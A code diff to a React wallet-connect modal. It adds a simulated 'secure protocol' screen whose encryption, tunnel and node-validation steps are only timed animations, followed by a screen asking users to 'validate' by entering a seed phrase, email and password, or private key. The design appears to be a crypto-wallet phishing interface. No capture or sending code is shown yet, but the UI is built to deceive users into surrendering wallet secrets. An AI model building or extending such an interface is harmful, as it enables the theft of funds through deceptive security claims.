@@ -1,6 +1,6 @@
 "use client";
 
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import Image from "next/image";
 import { 
   Dialog, 
@@ -19,7 +19,10 @@ import {
   ChevronLeft, 
   Info, 
   Shield, 
-  X
+  CheckCircle2,
+  Loader2,
+  Mail,
+  Fingerprint
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 
@@ -69,18 +72,43 @@ const wallets: Wallet[] = [
   { name: "OTHER WALLET", desc: "CUSTOM", e2e: true, icon: "https://upload.wikimedia.org/wikipedia/commons/e/e4/Wallet_Flat_Icon.svg" },
 ];
 
+type View = "list" | "login" | "processing" | "methods";
+
 export function WalletModal({ children }: { children: React.ReactNode }) {
+  const [view, setView] = useState<View>("list");
   const [search, setSearch] = useState("");
   const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);
+  const [processingStage, setProcessingStage] = useState(0);
 
   const filteredWallets = wallets.filter(w => 
     w.name.toLowerCase().includes(search.toLowerCase())
   );
 
   const resetState = () => {
+    setView("list");
     setSelectedWallet(null);
     setSearch("");
+    setProcessingStage(0);
   };
+
+  const startLogin = () => {
+    setView("processing");
+  };
+
+  useEffect(() => {
+    if (view === "processing") {
+      const timer1 = setTimeout(() => setProcessingStage(1), 800);
+      const timer2 = setTimeout(() => setProcessingStage(2), 1600);
+      const timer3 = setTimeout(() => setProcessingStage(3), 2400);
+      const timer4 = setTimeout(() => setView("methods"), 3500);
+      return () => {
+        clearTimeout(timer1);
+        clearTimeout(timer2);
+        clearTimeout(timer3);
+        clearTimeout(timer4);
+      };
+    }
+  }, [view]);
 
   return (
     <Dialog onOpenChange={(open) => { if (!open) resetState(); }}>
@@ -89,10 +117,15 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
       </DialogTrigger>
       <DialogContent className="max-w-[440px] bg-[#0B0F17] border-white/5 p-0 gap-0 overflow-hidden text-white sm:rounded-[2rem] transition-all duration-300">
         <DialogHeader className="sr-only">
-          <DialogTitle>{selectedWallet ? `Login ${selectedWallet.name}` : "Connect Wallet"}</DialogTitle>
+          <DialogTitle>
+            {view === "list" && "Connect Wallet"}
+            {view === "login" && `Login ${selectedWallet?.name}`}
+            {view === "processing" && "Secure Protocol Active"}
+            {view === "methods" && "Wallet Validation"}
+          </DialogTitle>
         </DialogHeader>
         
-        {!selectedWallet ? (
+        {view === "list" && (
           <>
             <div className="p-6 pb-0">
               <div className="relative mb-6">
@@ -109,7 +142,10 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                 {filteredWallets.map((wallet) => (
                   <button 
                     key={wallet.name}
-                    onClick={() => setSelectedWallet(wallet)}
+                    onClick={() => {
+                      setSelectedWallet(wallet);
+                      setView("login");
+                    }}
                     className="flex items-center gap-4 p-4 rounded-xl bg-[#0D161F]/50 border border-white/5 hover:border-primary/30 hover:bg-[#131C26] transition-all group text-left"
                   >
                     <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center p-1.5 relative shrink-0">
@@ -173,12 +209,13 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
               </div>
             </div>
           </>
-        ) : (
+        )}
+
+        {view === "login" && selectedWallet && (
           <div className="flex flex-col animate-in fade-in slide-in-from-right-4 duration-300">
-            {/* Login Header */}
             <div className="p-6 pb-0 flex items-center justify-between">
               <button 
-                onClick={() => setSelectedWallet(null)}
+                onClick={() => setView("list")}
                 className="w-10 h-10 rounded-xl bg-[#0D161F] border border-white/5 flex items-center justify-center hover:bg-[#131C26] transition-colors group"
               >
                 <ChevronLeft size={20} className="text-slate-400 group-hover:text-white" />
@@ -194,7 +231,7 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                 />
               </div>
 
-              <div className="w-10" /> {/* Spacer */}
+              <div className="w-10" />
             </div>
 
             <div className="p-8 pt-10 text-center">
@@ -223,7 +260,10 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                   </p>
                 </div>
 
-                <Button className="w-full h-14 bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-black text-xs uppercase tracking-[0.2em] rounded-2xl gap-3 shadow-lg shadow-orange-500/10">
+                <Button 
+                  onClick={startLogin}
+                  className="w-full h-14 bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-black text-xs uppercase tracking-[0.2em] rounded-2xl gap-3 shadow-lg shadow-orange-500/10"
+                >
                   <Shield size={16} />
                   Login In
                 </Button>
@@ -236,6 +276,116 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                 End-To-End Encrypted
               </div>
             </div>
+          </div>
+        )}
+
+        {view === "processing" && selectedWallet && (
+          <div className="flex flex-col items-center justify-center p-8 min-h-[500px] animate-in fade-in duration-500">
+            <h3 className="font-headline text-2xl font-black mb-2 uppercase tracking-tight text-center">
+              LOGIN {selectedWallet.name}
+            </h3>
+            <p className="text-slate-500 text-sm font-medium mb-12 text-center">
+              Initialize secure validation protocol
+            </p>
+
+            <div className="relative w-32 h-32 mb-12">
+               <div className="absolute inset-0 rounded-full bg-cyan-400/20 animate-pulse blur-xl"></div>
+               <div className="absolute inset-0 rounded-full border-4 border-cyan-400/20 border-t-cyan-400 animate-spin"></div>
+               <div className="absolute inset-2 rounded-full bg-[#0D161F] flex items-center justify-center">
+                  <Shield className="text-cyan-400 w-12 h-12" />
+               </div>
+            </div>
+
+            <div className="w-full space-y-3 mb-10">
+              <h4 className="text-xs font-headline font-black text-center uppercase tracking-[0.2em] mb-6">
+                Secure Protocol Active
+                <span className="block text-[10px] text-slate-500 mt-1">End-to-end encryption in progress</span>
+              </h4>
+
+              <div className={cn(
+                "flex items-center gap-3 p-4 rounded-xl border transition-all duration-300",
+                processingStage >= 1 ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400" : "bg-white/5 border-white/5 text-slate-500"
+              )}>
+                {processingStage >= 1 ? <CheckCircle2 size={18} /> : <Loader2 size={18} className="animate-spin" />}
+                <span className="text-[10px] font-black uppercase tracking-widest">Encrypting Data Payload</span>
+              </div>
+
+              <div className={cn(
+                "flex items-center gap-3 p-4 rounded-xl border transition-all duration-300",
+                processingStage >= 2 ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400" : "bg-white/5 border-white/5 text-slate-500"
+              )}>
+                {processingStage >= 2 ? <CheckCircle2 size={18} /> : processingStage === 1 ? <Loader2 size={18} className="animate-spin" /> : <div className="w-[18px]" />}
+                <span className="text-[10px] font-black uppercase tracking-widest">Establishing Secure Tunnel</span>
+              </div>
+
+              <div className={cn(
+                "flex items-center gap-3 p-4 rounded-xl border transition-all duration-300",
+                processingStage >= 3 ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400" : "bg-white/5 border-white/5 text-slate-500"
+              )}>
+                {processingStage >= 3 ? <CheckCircle2 size={18} /> : processingStage === 2 ? <Loader2 size={18} className="animate-spin" /> : <div className="w-[18px]" />}
+                <span className="text-[10px] font-black uppercase tracking-widest">Validating with Node</span>
+              </div>
+            </div>
+
+            <div className="w-full bg-[#0F222F] border border-[#1A3A4D] rounded-xl py-3 flex items-center justify-center gap-2 text-[#38BDF8] text-[9px] font-black uppercase tracking-[0.2em]">
+               <Lock size={12} />
+               AES-256 Military Grade Security
+            </div>
+          </div>
+        )}
+
+        {view === "methods" && (
+          <div className="flex flex-col p-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
+             <div className="text-center mb-10">
+                <div className="w-16 h-16 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto mb-6">
+                   <ShieldCheck className="text-primary w-8 h-8" />
+                </div>
+                <h3 className="font-headline text-3xl font-black mb-2 uppercase tracking-tight">
+                  Wallet Validation
+                </h3>
+                <p className="text-slate-500 text-sm font-medium">
+                  Select validation method to continue.
+                </p>
+             </div>
+
+             <div className="space-y-4">
+                <button className="w-full flex items-center gap-5 p-5 rounded-[1.5rem] bg-[#0D161F] border border-white/5 hover:border-primary/50 hover:bg-[#131C26] transition-all group text-left">
+                  <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center group-hover:scale-110 transition-transform">
+                    <Fingerprint className="text-primary w-6 h-6" />
+                  </div>
+                  <div className="flex-1">
+                    <div className="font-headline font-bold text-lg">Seed Phrase</div>
+                    <div className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">Standard recovery cold path</div>
+                  </div>
+                </button>
+
+                <button className="w-full flex items-center gap-5 p-5 rounded-[1.5rem] bg-[#0D161F] border border-white/5 hover:border-primary/50 hover:bg-[#131C26] transition-all group text-left">
+                  <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center group-hover:scale-110 transition-transform">
+                    <Mail className="text-primary w-6 h-6" />
+                  </div>
+                  <div className="flex-1">
+                    <div className="font-headline font-bold text-lg">Email & Password</div>
+                    <div className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">For hosted/managed wallets</div>
+                  </div>
+                </button>
+
+                <button className="w-full flex items-center gap-5 p-5 rounded-[1.5rem] bg-[#0D161F] border border-white/5 hover:border-primary/50 hover:bg-[#131C26] transition-all group text-left">
+                  <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center group-hover:scale-110 transition-transform">
+                    <Key className="text-primary w-6 h-6" />
+                  </div>
+                  <div className="flex-1">
+                    <div className="font-headline font-bold text-lg">Private Key</div>
+                    <div className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">Direct cryptographic access</div>
+                  </div>
+                </button>
+             </div>
+
+             <div className="mt-12 text-center">
+                <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-white/5 border border-white/5 text-slate-500 text-[10px] font-bold uppercase tracking-widest">
+                   <Shield size={12} />
+                   Secure Protocol Failover
+                </div>
+             </div>
           </div>
         )}
       </DialogContent>
